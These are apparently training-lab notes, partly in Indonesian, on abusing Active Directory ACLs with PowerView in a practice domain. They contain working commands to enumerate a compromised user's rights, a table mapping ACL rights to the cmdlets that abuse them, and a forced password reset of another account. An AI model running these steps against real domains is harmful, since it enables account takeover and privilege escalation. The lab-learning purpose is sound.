---
layout: default
---

### ACL Enumeration With Powerview
In this section we use scenarion that:
1. we have compromise user with username wley
2. User wley has Force Change Password Object to User damundsen
3. Login as damundsen with the password that we create,
4. Enumerate this user has Generic Write rights to Help Desk Level 1 Groups
5. Adding ourself (damundsen) as member of HELP DESK IT LEVEL 1

# ACL - Force Change Password
```python
	
- ForceChangePassword:  abused with Set-DomainUserPassword
- Add Members:  abused with Add-DomainGroupMember
- GenericAll:  abused with Set-DomainUserPassword or Add-DomainGroupMember
- GenericWrite:  abused with Set-DomainObject
- WriteOwner:  abused with Set-DomainObjectOwner
- WriteDACL:  abused with Add-DomainObjectACL
- AllExtendedRights:  abused with Set-DomainUserPassword or Add-DomainGroupMember
- Addself:  abused with Add-DomainGroupMember
```
   
### Enumerate ForceChangePassword Right

```python
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

##output Yang Diharapkan
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
```

*Enumerate All Users* 
```python
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

```

## Abusing Force Change Password
**changing damundsen password without knowing his old password**

First, Store Password user kita ke powershell credential
   
```python
   PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD Kita >' -AsPlainText -Force
   PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Then, Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
```python
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
 

